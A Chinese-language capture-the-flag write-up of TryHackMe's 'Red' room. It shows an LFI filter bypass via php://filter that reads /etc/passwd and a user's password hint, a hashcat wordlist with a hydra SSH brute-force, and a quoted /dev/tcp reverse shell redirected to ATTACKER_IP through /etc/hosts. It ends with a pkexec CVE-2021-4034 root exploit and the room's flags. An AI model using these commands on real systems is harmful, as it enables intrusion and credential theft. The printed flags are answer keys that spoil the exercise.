---
title: "Red Writeup"
date: 2023-07-17
tags: [writeup, ctf, tryhackme]
description: "利用暴露的服务获取立足点，并利用 CVE-2021-4034 pkexec 漏洞拿下 TryHackMe 的 Red 房间的 root 权限。"
---

## 环境配置 

我们首先需要连接到 TryHackMe 的 VPN 服务器。你可以访问 [Access](https://tryhackme.com/access) 页面获取更多相关信息。

我将使用 openvpn 连接到服务器。命令如下：

```
$ sudo openvpn --config NovusEdge.ovpn
```

## 信息收集

现在一切准备就绪，我们来做一些基础的信息收集：
```shell-session
$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -r 1-65535  -- -sC -oN rustscan_port_scan.txt
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
| ssh-hostkey: 
|   3072 e2:74:1c:e0:f7:86:4d:69:46:f6:5b:4d:be:c3:9f:76 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC1MTQvnXh8VLRlrK8tXP9JEHtHpU13E7cBXa1XFM/TZrXXpffMfJneLQvTtSQcXRUSvq3Z3fHLk4xhM1BEDl+XhlRdt+bHIP4O5Myk8qLX9E1FFpcy3NrEHJhxCCY/SdqrK2ZXyoeld1Ww+uHpP5UBPUQQZNypxYWDNB5K0tbDRU+Hw+p3H3BecZwue1J2bITy6+Y9MdgJKKaVBQXHCpLTOv3A7uznCK6gLEnqHvGoejKgFXsWk8i5LJxJqsHtQ4b+AaLS9QAy3v9EbhSyxAp7Zgcz0t7GFRgc4A5LBFZL0lUc3s++AXVG0hJ9cdVTBl282N1/hF8PG4T6JjhOVX955sEBDER4T6FcCPehqzCrX0cEeKX6y6hZSKnT4ps9kaazx9O4slrraF83O9iooBTtvZ7iGwZKiCwYFOofaIMv+IPuAJJuRT0156NAl6/iSHyUM3vD3AHU8k7OISBkndyAlvYcN/ONGWn4+K/XKxkoXOCW1xk5+0sxdLfMYLk2Vt8=
|   256 fb:84:73:da:6c:fe:b9:19:5a:6c:65:4d:d1:72:3b:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDooZFwx0zdNTNOdTPWqi+z2978Kmd6db0XpL5WDGB9BwKvTYTpweK/dt9UvcprM5zMllXuSs67lPNS53h5jlIE=
|   256 5e:37:75:fc:b3:64:e2:d8:d6:bc:9a:e6:7e:60:4d:3c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDyWZoVknPK7ItXpqVlgsise5Vaz2N5hstWzoIZfoVDt
80/tcp open  http    syn-ack
| http-title: Atlanta - Free business bootstrap template
|_Requested resource was /index.php?page=home.html
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

$ rustscan -b 4500 -a TARGET_IP --ulimit 5000 -t 2000 -p 22,80  -- -sV -oN rustscan_service_scan.txt
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

很好，有两个正在运行的服务：一个 http 服务器和一个 ssh 服务器。来看看 http 服务器上有什么：
![](/assets/img/writeup_assets/red/port-80.png)

注意这个 URL：`http://TARGET_IP/index.php?page=home.html`。这看起来像是一个潜在的 LFI 利用点。我们来验证一下。可以尝试包含 `index.php` 文件看看会发生什么：
```shell-session
$ curl "http://TARGET_IP/index.php?page=./index.php"

<?php 

function sanitize_input($param) {
    $param1 = str_replace("../","",$param);
    $param2 = str_replace("./","",$param1);
    return $param2;
}

$page = $_GET['page'];
if (isset($page) && preg_match("/^[a-z]/", $page)) {
    $page = sanitize_input($page);
    readfile($page);
} else {
    header('Location: /index.php?page=home.html');
}

?>

```

搞定！可以看到 `index.php` 接收 `page` 参数并读取它指定的文件。虽然有过滤处理，但我们可以绕过。来看看是否可以使用 `php://` filter 伪协议直接包含 `/etc/issue`：
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/etc/issue

Ubuntu 20.04.4 LTS \n \l
```

漂亮！那 `/etc/passwd` 呢？
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/etc/passwd

...
blue:x:1000:1000:blue:/home/blue:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
red:x:1001:1001::/home/red:/bin/bash
```

好的，有两个潜在可获取权限的用户：`red` 和 `blue`。我们来看看他们家目录下的文件：
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.bashrc
<NORMAL STUFF>

$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/red/.bashrc
<NOPE, NOTHING INTERESTING>

$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.bash_history
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt
sudo apt-get remove hashcat -y
```

哦吼，有意思。看来有人用 hashcat 生成了密码字典……然后删除了？没有记录显示这个 `.reminder` 被删掉了，值得一试：
```shell-session
$ curl http://TARGET_IP/index.php?page=php://filter/resource=/home/blue/.reminder
sup3r_p@s$w0rd!
```

太棒了！现在我们来生成 `passlist.txt`：
```shell-session
$ hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
$ wc passlist.txt                                  
  77   77 1114 passlist.txt
```

既然其中一个提示写着：
> 2. Red 喜欢更改对手的密码，但通常改动不大。

我推测这个 passlist 包含了 `blue` 的所有可能密码。让我们尝试爆破进去。

## 获取初始权限

```shell-session
$ hydra -l blue -P passlist.txt -v TARGET_IP ssh  
...
[22][ssh] host: TARGET_IP   login: blue   password: [PASSWORD FROM passlist.txt]
...
```

现在用这些凭据登录机器：
```shell-session
$ ssh blue@TARGET_IP
...
blue@red:~$ ls -la
total 40
drwxr-xr-x 4 root blue 4096 Aug 14  2022 .
drwxr-xr-x 4 root root 4096 Aug 14  2022 ..
-rw-r--r-- 1 blue blue  166 Jul 17 13:30 .bash_history
-rw-r--r-- 1 blue blue  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 blue blue 3771 Feb 25  2020 .bashrc
drwx------ 2 blue blue 4096 Aug 13  2022 .cache
-rw-r----- 1 root blue   34 Aug 14  2022 flag1
-rw-r--r-- 1 blue blue  807 Feb 25  2020 .profile
-rw-r--r-- 1 blue blue   16 Aug 14  2022 .reminder
drwx------ 2 root blue 4096 Aug 13  2022 .ssh
blue@red:~$ cat flag1
THM{Is_thAt_all_y0u_can_d0_blU3?}
```

> 第一个 flag 是什么？
> 
> 答案：`THM{Is_thAt_all_y0u_can_d0_blU3?}`

在使用 `linpeas` 和 `pspy` 进行了一番分析后（或者你也可以直接用 `ps -aux`），我们注意到了两件事：

1. `/etc/hosts` 文件中有一条记录，而且我们只能对其进行_追加修改_：

```plaintext
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
```

2. 有一个持续运行的进程：

```shell
bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &
```

_但是_ 192.168.0.1 这个 IP 实际上什么都不通。所以我们只需在 `/etc/hosts` 中为 `redrules.thm` 添加一条指向我们自己机器的记录，并启动监听器来获取 red 用户的反弹 shell：
```shell-session
## On target:
$ echo "ATTACKER_IP redrules.thm" >> /etc/hosts

## On our machine:
$ nc -nvlp 9001

red@red$ ls
flag2

red@red$ cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}
```

> 第二个 flag 是什么？
> 
> 答案：`THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}`

## 权限提升

枚举信息：
```shell-session
$ find / -perm /u=s,g=s 2>/dev/null
...
...
/home/red/.git/psexec
```

好的……那么。red 的家目录里有一个 `psexec`。来看看它是哪个版本：
```shell-session
red@red$ /home/red/.git/psexec --version
psexec version 0.105
```

网上随便搜一下就能发现这个版本存在漏洞，可以用来提权：（CVE-2021-4034）
我将使用一个用 python 编写的 PoC exploit：https://github.com/Almorabea/pkexec-exploit
脚本会做轻微修改：
```diff
- libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
+ libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
```

_把这个传到目标机器上并运行它来获取 root shell :)_
一旦拿到 root shell，我们就可以获取 root flag 了：
```shell-session
red@red$ python3 exploit.py
whoami
root

ls /root
...
flag3
...

cat /root/flag3
THM{Go0d_Gam3_Blu3_GG}
```

> 第三个 flag 是什么？
> 
> 答案：`THM{Go0d_Gam3_Blu3_GG}`


## 总结

说实话，这台靶机花了我比我好意思承认的时间还要多得多，全拜那个恶心搞人的踢人机制所赐。再加上我把事情想复杂了，一整个钻进了兔子洞。不管怎样……希望这篇 writeup 对你有所帮助。如果你喜欢它，欢迎在 [github](https://github.com/NovusEdge) 上关注我，并在 [repo](https://github.com/NovusEdge/thm-writeups) 点个 star


- 房间：[Red](https://tryhackme.com/room/redisl33t)
